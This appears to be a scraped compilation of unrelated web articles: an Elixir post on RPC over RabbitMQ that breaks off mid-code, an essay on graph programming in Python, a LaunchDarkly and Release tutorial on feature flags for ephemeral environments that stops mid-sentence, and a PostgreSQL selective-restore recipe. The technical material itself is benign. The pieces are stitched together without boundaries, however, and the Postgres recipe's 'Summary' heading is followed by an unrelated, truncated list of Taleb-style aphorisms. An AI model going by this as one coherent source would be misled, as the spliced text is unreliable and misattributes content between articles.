<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>At <a href="https://www.community.com/">Community</a> we use <a href="https://www.rabbitmq.com/">RabbitMQ</a>, a lot. It’s the infrastructure backbone that allows our services (over fourty at this point) to communicate with each other. That mostly happens through <strong>events</strong> (since we have an event-sourced system), but in some cases what we need is a <em>request-response</em> interaction between two services. This is the best tool in a few use cases, like retrieving data on the fly or asking a service to do something and return a response. An industry standard for such interactions is HTTP, but we are not big fans of that. Instead, since RabbitMQ is so ubiquitous in our system, we settled on using it for request-response interactions as well in the form of <strong>Remote Procedure Calls</strong> (RPCs). In this post, I’ll go over the architecture of such interactions, the RabbitMQ topologies we use to make them work, the benefits around reliability and the compromises around performance, and finally how this all implemented to be as fault-tolerant as possible with Elixir.</p>

<h2 id="what-is-an-rpc">What is an RPC</h2>

<p>An RPC can be seen as a function call across sytem boundaries, instead of at the code execution level. An RPC allows you to call a <em>procedure</em> on another service and treat it mostly like a local function call (with the additional error handling to account for the network interaction).</p>

<p><img alt="Sketch of caller and receiver of an RPC" src="https://andrealeopardi.com/assets/media//2020-11-23-rpc-over-rabbitmq-with-elixir/sketch-rpc-definition.png"></p>

<p>I won’t go into too much detail about RPCs themselves, but you’re probably familiar with a common form of RPC: HTTP. HTTP request-response interactions between services in a service-oriented architecture are essentially RPCs, they’re just less explicit on the fact that they’re <em>calling a procedure</em>. One of the benefits of RPCs is, like HTTP, that they are agnostic of technologies. A services written in Elixir can make an RPC (or HTTP request) to a service written in Go, for example. If you want to read more about RPCs, their definition, their benefits, and more, guess where I’ll link you to? Exactly, <a href="https://en.wikipedia.org/wiki/Remote_procedure_call">Wikipedia</a>.</p>

<p>Throughout this post, I will refer to the services involved in an RPC as the <strong>caller service</strong> and the <strong>receiver service</strong>.</p>

<h2 id="why-rpcs-over-rabbitmq">Why RPCs over RabbitMQ</h2>

<p>At Community, we chose to do RPCs over RabbitMQ, instead of the common service-to-service communication via HTTP, for a few reasons.</p>

<p>The main reason is that we want to use message queues as often as possible. When you have a queue-based message broker between services that talk to each other, the availability requirements of the services can be less demanding. If you have two services that communicate over HTTP, then if the receiver service is down it means that the requester service will not get a response and will have to implement request retries in order to increase the chances of a successful request. With RabbitMQ in the middle, if the receiver is down then the RPC is queued and can be picked up once the receiver comes back up.</p>

<p>Another important reason that influenced our decision is that we make heavy use of RabbitMQ for all sorts of things. This means our engineer know it well, our infrastructure is solid, and we have good systems to trace and observe messages flowing through it.</p>

<p>One compromise we had to make is that, generally speaking, RPCs over RabbitMQ tend to be <em>slower</em> than direct service-to-service communication (such as HTTP). This is hard to avoid given that in our case we have a message broker sitting between the caller service and the receiver service. That means that you’ll <em>at least</em> have twice the RTT (round-trip time) on the network, since the messages you’re sending and receiving need to jump through one more hop than if you do direct service-to-service communication. However, when we do RPCs the bottleneck is rarely the network or the message broker, and instead tends to be the processing of the RPC itself. So, we’re fine with the compromise here.</p>

<h2 id="rabbitmq-topology">RabbitMQ topology</h2>

<p>Let’s talk about the <strong>RabbitMQ topology</strong> that powers our RPC system. We have the following components in place:</p>

<ul>
  <li>
    <p>A <em>headers</em> exchange called <code>rpc</code>. Caller services publish RPCs to this exchange with two headers, <code>destination</code> (the receiver service name) and <code>procedure</code> (the procedure name).</p>
  </li>
  <li>
    <p>Per-service queues where RPCs end up. Their name usually looks like <code>receiver_service.rpcs</code>. A single queue is shared across multiple <em>instances</em> (nodes) of the same service. All the running instances of the receiver service consume from this queue.</p>
  </li>
  <li>
    <p>A binding between each per-service queue and the <code>rpc</code> exchange. Since <code>rpc</code> is a headers exchange, the binding happens on the headers. Most commonly, receiver services bind their queue to the <code>rpc</code> exchange on the <code>destination: receiver_service_name</code> header, but sometimes we can be more flexible and specific by also using the <code>procedure</code> header.</p>
  </li>
  <li>
    <p>A per-instance <em>response queue</em> where responses to RPCs are published by the receiver service. Each <em>instance</em> of the caller service consumes from its dedicated response queue.</p>
  </li>
</ul>

<p>Below is an artistic representation of the RabbitMQ topology. This one is for you, my visual friends.</p>

<p><img alt="Sketch of RabbitMQ topology" src="https://andrealeopardi.com/assets/media//2020-11-23-rpc-over-rabbitmq-with-elixir/sketch-rabbitmq-topology.png"></p>

<h2 id="caller-architecture">Caller architecture</h2>

<p>Our focus when designing this architecture <em>was not</em> performance. Since our system is event-sourced, when services need to access data <em>fast</em>, we usually have alternatives to RPCs. In those cases, instead of fetching data from another service via RPC, a service can usually build a “local” data store (usually Redis, but whatever fits best) by consuming events and have fast access to that data store. However, this doesn’t cover use cases where a service wants to ask another service to do something and return a result. This can be usually also be done via asynchronous events, but sometimes it really can’t and in any case we like the agility of RPCs for when we’re moving fast and don’t want to commit to particular data exchanges in the long term.</p>

<p>Instead, we heavily focused on reliability and resource utilization. We want our RPCs to succeed whenever they can. We also want to limit RabbitMQ resource utilization as much as possible, since the message broker architecture shares the broker between all the services that use it.</p>

<p>With these goals in mind, we came up with the topology described above. In the sketch below, I’m focusing on the caller service perspective.</p>

<p><img alt="Sketch of the architecture of the sender service" src="https://andrealeopardi.com/assets/media//2020-11-23-rpc-over-rabbitmq-with-elixir/sketch-caller-architecture.png"></p>

<p>This is what happens, step by step, when a service makes an RPC:</p>

<ul>
  <li>
    <p>The caller assigns a new UUID to the request and encodes the request (we happen to use Protobuf, but anything would work).</p>
  </li>
  <li>
    <p>The caller includes the name of the <em>response queue</em> in the <code>reply_to</code> metadata field of the RabbitMQ message.</p>
  </li>
  <li>
    <p>The caller publishes the request on the main RPC exchange (<code>rpc</code>) using headers to specify the <code>destination</code> and <code>procedure</code> to call.</p>
  </li>
  <li>
    <p>If publishing the request is successful, the caller stores the request in an in-memory key-value store (ETS for Elixir and Erlang folks), storing the mapping from request ID to caller process. This is used to map responses back to requests when they come back.</p>
  </li>
  <li>
    <p>The caller has a pool of AMQP channels also consuming from the response queue. When the response comes back on such queue, a consumer channel picks it up, finds the corresponding caller process from the in-memory key-value store, and hands the caller process the response.</p>
  </li>
</ul>

<p>From a code standpoint, an RPC really does look like a function call. The main difference is that an RPC can <em>definitely</em> fail due to the network interaction, so we always make sure to return a successful value or an error value. In Elixir, that translates to <code>{:ok, response}</code> or <code>{:error, reason}</code> tuples. In a typed language (say Haskell) it would be the “either” type. In Elixir-flavoured pseudocode, this is what an RPC looks like from the caller side:</p>

<div><div><pre><code><span>case</span> <span>RPCPool</span><span>.</span><span>call</span><span>(</span><span>"my_receiver_svc"</span><span>,</span> <span>"add"</span><span>,</span> <span>%{</span><span>"args"</span> <span>=&gt;</span> <span>[</span><span>4</span><span>,</span> <span>9</span><span>]})</span> <span>do</span>
  <span>{</span><span>:ok</span><span>,</span> <span>%{</span><span>"result"</span> <span>=&gt;</span> <span>result</span><span>}}</span> <span>-&gt;</span>
    <span>result</span> <span>#=&gt; 13</span>

  <span>{</span><span>:error</span><span>,</span> <span>reason</span><span>}</span> <span>-&gt;</span>
    <span>raise</span> <span>"failed because: </span><span>#{</span><span>inspect</span><span>(</span><span>reason</span><span>)</span><span>}</span><span>"</span> <span>#=&gt; such as :timeout</span>
<span>end</span>
</code></pre></div></div>

<h3 id="the-response-queue">The response queue</h3>

<p>It’s worth focusing on the <strong>response queue</strong>. This queue is declared by all AMQP channels in the caller pool when they start up. This is a common pattern in RabbitMQ since declaring resources (queues, exchanges, and bindings) is <em>idempotent</em>, that is, you can do it as many times as you want and the resource is declared only once.</p>

<p>The response queue is declared with a key property: <code>auto_delete</code>. When this property is present, a queue is deleted as soon as there are no channels consuming from it anymore. This is exactly the behavior we want: as long as a caller pool is “up and running”, there’s gonna be at least one channel consuming from the queue and handing responses over to caller processes. However, if the whole pool or the whole node for the caller goes down then the queue will be deleted. This works perfectly, because if the caller node goes down, then we likely lost the “context” of the requests, and even if the node will come back up then it won’t know what to do with the responses anymore. As <a href="https://www.rabbitmq.com/direct-reply-to.html">one RabbitMQ documentation page</a> puts it:</p>

<blockquote>
  <p>Reply messages sent using [RPC] are in general not fault-tolerant; they will be discarded if the client that published the original request subsequently disconnects. The assumption is that an RPC client will reconnect and submit another request in this case.</p>
</blockquote>

<p>In this way, we allow RabbitMQ to clean itself up and avoid leaving garbage in it, without writing any code to do so.</p>

<p>The code for each AMQP channel that consumes responses goes something like this:</p>

<div><div><pre><code><span>channel</span> <span>=</span> <span>AMQP</span><span>.</span><span>Channel</span><span>.</span><span>open</span><span>(</span><span>amqp_connection</span><span>)</span>

<span># "response_queue" is determined per-pool.</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Composition is like taking two things and connecting them. Not one thing is on top of, embedded or superior to the other, they just feed into each other. Consequently the functions involved are oblivious to one another, which is great because you get to mix and match, test and debug them separately.</p><p>Most composition utils or libraries will generate a new function or object that represents the composition of its constituents, but it is no longer possible to refer to the constituents. You sort of get a new impenetrable box (nesting all over again).</p><p>In typical composition you can continue composing into or out of this box, as long as the composition is done on the sides, and not the individual constituents. However, if you have non-unary functions, you need to start using currying and things may get complicated.</p><p>As humans we don’t think or talk this way, we can refer to concepts arbitrarily and compose freely in a non-unary fashion.</p><p>This work presents the notion of graph programming, a way to program by building graphs of functions from connecting pairs of functions in a non-enclosing way, and aims to replace typical function composition.</p><h2>Prerequisites</h2><p>I will use python to illustrate my examples. I will also be using a functional programming style.</p><p>You should be familiar with <strong><em>compose_left</em></strong> , <strong><em>pipe </em></strong>and<strong><em> curry</em></strong> to follow along.</p><p>In case you are not, here are plausible implementations for the first two:</p><figure id="w-node-2597c9518367-ecc4c967"><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbce2dbb35bb5f2e8168c57_Screen%20Shot%202020-11-24%20at%2012.39.04.png" loading="lazy" alt=""></p></figure><p>As for <strong><em>curry</em></strong> since its implementation is a bit less trivial you can use this usage example to get an idea about what it does:</p><figure id="w-node-24bb02446013-ecc4c967"><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbce30681fb5263ead5a8be_Screen%20Shot%202020-11-24%20at%2012.39.55.png" loading="lazy" alt=""></p></figure><h2>Non linear programs</h2><p>Consider the following situation, where you have the following pipeline:</p><p><strong><em>foo = compose_left(x_1, x_2, ..., x_n)</em></strong></p><p><strong><em>foo</em></strong> is a composition of some functions. Great.</p><p>Now imagine the case where <strong><em>x_n</em></strong> gets two arguments, instead of just one. So we can no longer have this composition by itself, and we are required to use currying and an extra <strong><em>def</em></strong> like so:</p><figure id="w-node-ab79ecf119f3-ecc4c967"><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbce3c05e7511ace38ff0da_Screen%20Shot%202020-11-24%20at%2012.43.03.png" loading="lazy" alt=""></p></figure><p>Currying is great, because we don’t need to complicate <strong><em>x_n</em></strong> to express that it will get its two dependencies in two different places in the code. <strong><em>side_input</em></strong> will find its way into <strong><em>x_n</em></strong> as <strong><em>arg2</em></strong>.</p><p>Still there is some leakage here. We needlessly expose the rest of the composition code to <strong><em>side_input</em></strong>. This could become pretty messy if I have many dependencies, and I want to give them at different times.</p><p>Consider the case where <strong><em>x_n</em></strong> is a member of two independent pipelines, each giving it a different input.</p><p>We might try to program it like this (which obviously won’t work):</p><figure id="w-node-00fd916ff7c5-ecc4c967"><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbce407256a75d5466fce22_Screen%20Shot%202020-11-24%20at%2012.44.14.png" loading="lazy" alt=""></p></figure><p>Calling <strong><em>foo</em></strong> or <strong><em>bar</em></strong> would give us a familiar exception about <strong><em>baz</em></strong> expecting two arguments but got only one.</p><p>We can overcome this with some imperative style:</p><figure id="w-node-ea6e64bb6715-ecc4c967"><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbce43672e5af3fcca58c93_Screen%20Shot%202020-11-24%20at%2012.44.57.png" loading="lazy" alt=""></p></figure><p>And while this works for simple cases, it would not scale to the general case. If I had several functions connected at different stages, I would then have to give up the composition notation and end up in imperative style, or simply have a single large function where everything is exposed to everything.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbce45cef0f2f3695f27d2b_Graph_Programming_by_uri_1.png" loading="lazy" alt=""></p><figcaption><br></figcaption><figcaption>Complex dependency structure (<em>Image by author</em>)</figcaption></figure><p>‍</p><p>Imagine having to write a single signature to support the above structure. It would have to be the union of <strong><em>d3</em></strong>, <strong><em>d1</em></strong>, <strong><em>p1</em></strong>, <strong><em>d2</em></strong>. The function body itself would expose the variables globally, and it would be pretty hard to understand the dependency structure.</p><p>As humans it’s pretty obvious how to express it. We just draw it. Let’s get back to the simple example above.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbce4cdb35bb578f7169176_Graph_Programming_by_uri_2.png" loading="lazy" alt=""></p><figcaption><br></figcaption><figcaption>No currying needed when you can draw (<em>Image by author</em>)</figcaption></figure><p>We can “code” it too, for example this is the code I used to generate the above image:</p><figure id="w-node-df6a04ac2ec9-ecc4c967"><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbce6299ba3354de8502d28_Screen%20Shot%202020-11-24%20at%2012.53.19.png" loading="lazy" alt=""></p></figure><p>So I should be able to do the same when programming.</p><h2>Prographers</h2><p>The word “graph” itself comes from drawing or painting, and this is really the right sense. We want to be able to draw programs, because our mental models of them are nonlinear structures*.</p><p>*The word programming itself comes from the earlier Greek word “prographein”. We are all really just prographers.</p><p><a href="https://github.com/hyroai/computation-graph">https://github.com/hyroai/computation-graph</a> implements the first graph-programming framework, in python.</p><p>It allows taking pure functions written in plain python, and declare their dependencies explicitly, without them being aware of each other. That is similar to any function composition framework. What cg does beyond that is a few other tricks.</p><h2>Non linear composition</h2><p>The first trick is generalizing composition to non unary functions, and pipelines to directed acyclic graphs (DAGs). Dependencies are not only “lines”, and so we should be able to, for example, connect two lines into a binary function. I only need to state the keyword I’m composing on to make this example complete.</p><p>An example:</p><figure id="w-node-cba60e3ef9ba-ecc4c967"><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbce64c09e861c77ba2247f_Screen%20Shot%202020-11-24%20at%2012.53.54.png" loading="lazy" alt=""></p></figure><p>Each composition is essentially a collection of edges, with some syntactic sugar that allows you to create substructures easily.</p><h2>Memory</h2><p>Pure functions and compositions are easy to work with. They are easy to test and reason about, and are not exposed to pesky state. But still reality needs programs with memory, or programs which are run a few times and retain some context so we needed to introduce state or memory into pure functions. The popular UI framework React has solved this problem using hooks (e.g. <strong><em>useState</em></strong>). We wanted to be more strict in the purity of the functions that we use, and not introduce any magic calls within the function. In other words we wanted the input to be fully described within the function’s parameter, and output to be fully defined as the function’s output.</p><p>We started by implementing a special kind of node, called a reducer. The reducer returns two elements, an output and its memory, and the computation graph framework would give the function its memory on the next “turn”, in a special argument called <strong><em>state</em></strong> (similar to <strong><em>self</em></strong> in python).</p><p>We then realized that this pattern can be implemented in a much simpler way, without any special keyword arguments or constructs. We realized that memory is a dependency into the future. Future here means the next time you run the computation graph. And so we changed the implementation to have something we call “future edges”. Future edges describe function composition in the axis of time. So a function can be composed (namely have an edge) onto itself or a some other functions (even functions it supposedly depends on!), without really creating loops. This is because the value needed for the current turn exists from the previous turn.</p><p>When we introduce this concept, we are no longer talking about DAGs, but general graphs, that may have “cycles” (as long as the cycle has at least one future edge to break it).</p><p>Note that when we introduced memory the signature of the entire computation graph becomes two elements, where one is the output and the other is the state, and when we run it again, we make sure to give it the state from the previous turn. So when zooming out, the entire computation graph has the signature of a reducer function.</p><h2>Logging</h2><p>Logging is a classic problem in programming. We write some code to do something, then we want to watch it and log what it is doing. As an example consider the pipeline <strong><em>compose_left(x, y, z_1, ..., z_n)</em></strong>.</p><p>And say we would like to watch the output of <strong><em>y</em></strong>. So we might do something like this:</p><figure id="w-node-84a627a4fed9-ecc4c967"><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbcf05acfb43b949c54f9a5_Screen%20Shot%202020-11-24%20at%2013.36.46.png" loading="lazy" alt=""></p></figure><p>But alas, <strong><em>z_1</em></strong> expects to get the output of <strong><em>y</em></strong>. This means we would have to complicate <strong><em>z_i</em></strong> to handle a pair of elements. We would like to avoid it. With graph programming this is trivial to do. Simply connect <strong><em>y</em></strong> into two facets:</p><figure id="w-node-2ba6874af009-ecc4c967"><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbcf0969bd80df73e79cd5e_Screen%20Shot%202020-11-24%20at%2013.37.48.png" loading="lazy" alt=""></p></figure><h2>Async programming</h2><p>Async in python is really hard to get right. Synchronous functions cannot call async ones and so mixing the two is nontrivial to say the least. In addition you have to carefully select when to <strong><em>await</em></strong> in two consecutive lines, and when to use things like <strong><em>asyncio.gather</em></strong>. But this information, of what needs to happen first, is already in your program. For example, the following example is not efficient.</p><figure id="w-node-318eb353e456-ecc4c967"><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbcf0e14349776252f3a83e_Screen%20Shot%202020-11-24%20at%2013.38.59.png" loading="lazy" alt=""></p></figure><p>This is because we can <strong><em>await</em></strong> on <strong><em>x</em></strong> in parallel to <strong><em>y</em></strong>. But why should we notice it as humans, instead of having it be inferred?</p><p>If we draw it, it becomes obvious.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbcf14c09e7536fa676e295_Graph_Programming_by_uri_3.png" loading="lazy" alt=""></p><figcaption><br></figcaption><figcaption>(<em>Image by author</em>)</figcaption></figure><p>‍</p><p>And so the computation graph library lets you mix async and synchronous functions, and even infers for you, using a topological sort, what can be run in parallel. This would be written as follows.</p><figure id="w-node-7bd05cbe3efa-ecc4c967"><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbcf190c24a43a2ec3705b7_Screen%20Shot%202020-11-24%20at%2013.41.55.png" loading="lazy" alt=""></p></figure><h2>Ambiguity</h2><p>Another cool feature is that you can actually compose more than one option onto a function, making the graph sort of like a nondeterministic model. This implies that the input can come from either edge. To make results predicable, these edges have priorities, so the computation graph will try the more prioritized edge first, and only if that computation path does not succeed (namely raises a specific exception), will the graph runner attempt a different path.</p><figure id="w-node-bfb6f5f3b95d-ecc4c967"><p><img src="https://uploads-ssl.webflow.com/5e28111d4277514e827921e5/5fbcf1e7cfb43b66c654fd60_Screen%20Shot%202020-11-24%20at%2013.43.21.png" loading="lazy" alt=""></p></figure><p>In the above code, <strong><em>g</em></strong> might get its input from <strong><em>f1</em></strong> or if that doesn’t work, from <strong><em>f2</em></strong>. Note we use the lower level API here, but this is very similar to <strong><em>compose_left</em></strong>.</p><h2>TODO: Loops</h2><p>The computation graph does not yet support loops. When it will, they would probably be implemented as a special edge as well. This is still in early planning, comments about this (or PRs) are welcome.</p><h2>Small note: Computation graphs and monads</h2><p>Some of the problems discussed above are traditionally solved by monads in functional programming languages. Because I am not experienced myself with working with monads, I choose to leave it for the reader to determine the relationship of graph programming and monads, and may revisit this section in the future.</p><p>Imperative programming is characterized by iterative nesting. A function has embedded calls to other ones. By embedded I mean that these calls are in the function body, and so there is a tight coupling between a function and its constituents. This has many shortcomings and is typically solved by function composition.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><h2 id="feature-flags-and-ephemeral-environments">Feature Flags and Ephemeral Environments</h2><p>Feature Flags are a necessary and ubiquitous part of modern software development.  As your company and the complexity of your application grows it becomes imperative to be able to control what features are available to your internal development teams, stakeholders and customers.  In the long-ago, before-times, we would just have a variable that you would toggle between true and false to control behavior of your application.  However, as application development transitioned to the Web we needed the same kind of control, except that hard-coded feature flags just weren’t going to cut it. Enter Dynamic Feature Flags!</p><p>Dynamic feature flags were a big improvement over static feature flags, but also added complexity and presented challenges different from static feature flags.  Gone were hard-coded flags, but they were replaced with if statements and more importantly, retrieving the appropriate flags for your application.  Most people started by rolling their own, but as developing with feature flags gained popularity many different companies popped into existence looking to solve the problems of:</p><ul><li>One interface to manage your flags</li><li>Easy maintenance of your flags</li><li>Very fast and reliable retrieval of your flags</li><li>Splitting traffic to one feature or another </li></ul><p>While companies like LaunchDarkly, Optimizely, Rollout, Split.io and others made it fairly easy to create and manage these flags this doesn’t solve all of your issues.  Many software orgs, especially as they grow, need lots of environments for testing. This poses a challenge to your Feature Flag setup specifically if your environments are ephemeral.</p><p>Ephemeral environments are like any environment except they will be removed in a relatively short amount of time unlike your staging or production environments.  Good examples are:</p><ul><li>Feature branches</li><li>Sales Demos</li><li>Load Testing</li><li>Refactors</li></ul><p>These environments may not last a long time, but they are exceedingly important and can be just as complex as production.  While a sales demo environment may be able to function with seed data, a load testing environment will need production or production-like data and many replicas of each service to give a valid result.  These can be super complex to create and manage and their ephemeral nature can play havoc with your feature flag setup.</p><h2 id="feature-flag-environments-to-the-rescuesort-of">Feature Flag Environments to the Rescue…Sort of</h2><p>LaunchDarkly (and others) recognized this issue and created the concept of environments in their own applications.  You can read about their implementation here.  They have apis that allow you to create and manipulate these sets of feature flags on an environment by environment basis. This works great if you have a finite set of environments and the set of them doesn’t change often, but with ephemeral environments the ability to spin them up and down is a feature not a bug.</p><p>In order to simplify this issue most people create two kinds of environments in their favorite Feature Flag provider: one for development (or test) and one for production.  In larger organizations development teams may have a few, such as development, test, uat, staging, and production.  This works fine as long as you don’t want to add another one or you never take the plunge toward truly ephemeral application environments.  </p><p>Once you move to ephemeral environments most people take the shortcut of assigning every ephemeral environment to a single Feature Flag environment, which is simple enough, but creates a large problem with people stepping on each other’s toes.  </p><p>Imagine you have 10 environments all pointing to a single database with writes happening from all those environments: it’s the same issue here.  The great thing about feature flags is the ability to toggle them and see different behavior, but if every environment is pointing to the same one you now have another resource contention problem.  If you toggle Feature A ‘on’ what’s to stop your co-worker from toggling it ‘off’?  Any issues you have with permanent staging environments are magnified with ephemeral environments.</p><p>The best solution would be upon the creation of an ephemeral environment you would create an environment in LaunchDarkly based on something unique about your ephemeral environment and when it comes up, you would make sure it was using the unique SDK api for that particular Feature Flag Environment.  Let’s implement the workflow and see how that would work with Release!</p><p><img src="https://images.ctfassets.net/qf96nnjfyr2y/6iJFF3Zu70PwOxkxXCKtp3/24f7412df0886df79f4ff1239d1eeffc/image9.png" alt="FF workflow"></p><h2 id="working-with-ephemeral-environments">Working with Ephemeral Environments</h2><p>In order to try this out with Release we need a repository with a Docker File that has implemented Feature Flags with LaunchDarkly.  I’m going to use <a href="https://github.com/elanderholm/rails_postgres_redis" target="_blank" rel="noreferrer">this</a> repository on Github and you can do the same by first forking the repository so you can use it to create an application with Release.</p><p>Once you have forked the repository you can navigate to <a href="https://releaseapp.io/" target="_blank" rel="noreferrer">releaseapp.io </a>and sign-in using github in order to follow along with this example.</p><p>The steps to get our ephemeral environments created in Release with support for environments in LaunchDarkly are:</p><ol><li>Create our application in Release</li><li>Create a job with Release to create the environment in LaunchDarkly</li><li>Add some environment variables so the application can contact LaunchDarkly and pull in the SDK Api key from our newly created LaunchDarkly Environment</li><li>Deploy our Ephemeral Environment</li></ol><blockquote><p>If you don’t have a launch darkly account, you can create one for free for 30 days to use for this example.  You will also need to create at least one feature flag.  If you already have a launch darkly account with a lot of feature flags you can just skip this step.</p></blockquote><p><img src="https://images.ctfassets.net/qf96nnjfyr2y/4O6rr31peejXL43aLTPrAi/dc7022076bd7b28e2e189431a5262c7b/image3.png" alt="LaunchDarkly Test Flag"></p><h2 id="create-the-application-in-release">Create the Application In Release</h2><p>Once we are logged into Release we want to click <strong>Create New Application</strong> in the left-hand sidebar.  After doing that we will be presented with Create New Application Workflow.</p><p><img src="https://images.ctfassets.net/qf96nnjfyr2y/5LbYmJLNvAIZwuUqcjMtsv/5aeb59c6fef3b73532e04125a676dd0e/image12_png.png" alt="Create Application With Refresh Button"></p><p>First, we will click the “refresh” button to find our newly forked repository.  Then, we will select that repository and “Docker” for the “api” service.  Finally,  name your application.  Once you have finished click the purple “Generate App Template” button.</p><p><img src="https://images.ctfassets.net/qf96nnjfyr2y/7HFUIDbur1n6r5aELXgb01/f8e12dfed6ca2cb6130fbdb68c98342a/image2.png" alt="Pick your Repository"></p><p>Lastly name your application and generate the template for your configuration.</p><p><img src="https://images.ctfassets.net/qf96nnjfyr2y/WKSmTIAeyTjNKCHLTVbEe/a17a56b380c61066b4fa89fc85690475/image4.png" alt="Name your Application"></p><h2 id="modify-the-application-template">Modify the Application Template</h2><p>Before we can deploy our environment(s) we need to make a modification to our application template and add a few environment variables.  We also need to create a job that will create our LaunchDarkly environment upon initial environment deployment.  Jobs in Release are described in detail <a href="https://docs.releaseapp.io/reference-guide/application-settings/application-template#jobs" target="_blank" rel="noreferrer">here</a>.  The TL;DR is that with a small amount of configuration you can run any arbitrary script or task in a container.  For example, these jobs are very useful for running migrations before a deployment of your backend service.  In this case we will run a rake task to set up our LaunchDarkly Environment.</p><div><pre><p><span>1</span><span>jobs:</span></p><p><span>2</span><span>- name: create-launch-darkly-env</span></p><p><span>3</span><span>  from_services: api</span></p><p><span>4</span><span>  args:</span></p><p><span>5</span><span>  - bundle</span></p><p><span>6</span><span>  - exec</span></p><p><span>7</span><span>  - rake</span></p><p><span>8</span><span>  - launch_darkly:create_environment</span></p></pre></div><blockquote><p>The above yaml represents a job in Release</p></blockquote><p>We will place the above lines right before the “services” stanza in our application template.</p><div><pre><p><span>1</span><span>memory:</span></p><p><span>2</span><span>   limits: 1Gi</span></p><p><span>3</span><span>   requests: 100Mi</span></p><p><span>4</span><span> replicas: 1</span></p><p><span>5</span><span>jobs:</span></p><p><span>6</span><span>  - name: create-launch-darkly-env</span></p><p><span>7</span><span>    from_services: api</span></p><p><span>8</span><span>    args:</span></p><p><span>9</span><span>    - bundle</span></p><p><span>10</span><span>    - exec</span></p><p><span>11</span><span>    - rake</span></p><p><span>12</span><span>    - launch_darkly:create_environment</span></p><p><span>13</span><span>services:</span></p><p><span>14</span><span>  - name: api</span></p><p><span>15</span><span>    image: erik-opsnuts-test-001/rails_postgres_redis/api</span></p><p><span>16</span><span>    has_repo: true</span></p><p><span>17</span><span>    static: false</span></p></pre></div><blockquote><p>Place the jobs snippet into the Application Template</p></blockquote><p>In order for Release to utilize this job as part of the workflow to deploy an environment we will need to add one line near the bottom of the file in the ‘workflows` section.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>In a scenario where a production database backup becomes too large to be handled nimbly selective database restoration becomes quite useful for recovering pre-determined sets of data.</p>

<p>PostgreSQL allows restoration of individual tables from dump files which can be used, for instance, to query a particular table for retrieving data from a previous state in time, say, for investigating a bug, or recovering accidentally deleted data.</p>



<p>Naturally the first step here is to generate your database backups. Ideally you should set up an automation that recurrently generates backups and stores them in a safe place.</p>

<p>The <code>pg_dump</code> utility is used for generating the entire PostgreSQL database backup:</p>

<div><div><pre><code>pg_dump.exe <span>--host</span> localhost <span>--port</span> 5432 <span>--username</span> <span>"postgres"</span> <span>--schema</span> <span>"public"</span> <span>--format</span> custom <span>--blobs</span> <span>--verbose</span> <span>--file</span> <span>"my_database.dump"</span> <span>"my_database"</span>
</code></pre></div></div>

<p>In my case I have a recurring task scheduled to run daily (at dawn) for generating the backup file and uploading it to AWS S3 for storage.</p>



<p>Now whenever I need to restore a specific table for data recovery or bug investigating purposes here’s my go to recipe:</p>

<p><b>1)</b> Download daily backup file of interest from S3</p>

<p><b>2)</b> Create an empty local database <code>my_database_restored</code></p>

<p><b>3)</b> Create the table that needs to be restored <code>my_table</code> in the empty database</p>

<p>Some tips:</p>
<ul>
  <li>The table name, column names and column types should match those of the original database</li>
  <li>It’s not necessary to recreate any of the table’s indexes, so use this to intelligently reduce restoration time and database disk usage 🤓</li>
</ul>

<p><b>4)</b> Finally run <code>pg_restore</code> to selectively import desired table’s data:</p>

<div><div><pre><code>pg_restore.exe <span>-U</span> postgres <span>--data-only</span> <span>-d</span> <span>"my_database_restored"</span> <span>-t</span> <span>"my_table"</span> <span>"my_database.dump"</span>
</code></pre></div></div>

<p>That’s it, after the command completes all table data will be available in your single table database for querying.</p>

<p>Summary</p>



<ol><li>Every aphorism here is about a Procrustean bed of sorts – we humans, facing limited knowledge, and things we do not observe, the unseen and the unknown, resolve the tension by squeezing life and the world into crisp commoditized ideas, reductive categories, specific vocabularies, and prepackaged narratives, which, on the occasion, has explosive consequences. Further,w e seem unaware of this backward fitting, much like tailors who take great pride in delivering the perfectly fitting suit – but do so by surgically altering the limbs of their customers. For instance, few realize that we are changing the brains of schoolchildren through medication in order to make them adjust to the curriculum, rather than the reverse. (My use of the metaphor of the Procrustes bed isn’t just about something in the wrong box; it’s mostly that inverse operation of changing the wrong variable, here the person rather than the bed. Note that every failure of what we call “wisdom” (couple with technical proficiency) can be reduced to Procrustean bed situation.)</li></ol>



<p>Key Takeaways</p>



<ol><li>Bed of Procrustes – fit person/model to the situation rather than the other way around.&nbsp;</li><li>Work destroys your soul by stealthily invading your brain during the hours not officially spent working; be selective about professions</li><li>Using, as an excuse, others’ failure of common sense is in itself a failure of common sense</li><li>Life is about execution rather than purpose</li><li>The ultimate freedom lies in not having to explain why you did something</li><li>You exist if and only if you are free to do things without a visible objective, with no justification and, above all, outside the dictatorship of someone else’s narrative</li><li>The source of the tragic in history is in mistaking someone else’s unconditional for conditional – and the reverse</li><li>What fools call “wasting time is most often the best investment</li><li>You want to avoid being disliked without being envied or admired</li><li>The fastest way to become rich is to socialize with the poor; the fastest way to become poor is to socialize with the rich</li><li>You will be civilized on the day you can spend a long period doing nothing, learning nothing, and improving nothing, without feeling the slightest amount of guilt</li><li>There are 2 types of people: those who try to win and those who try to win arguments. They are never the same</li><li>Social networks present information about what people like; more informative if, instead, they described what they don’t like</li><li>My only measure of success is how much time you have to kill</li><li>Only in recent history has “working hard” 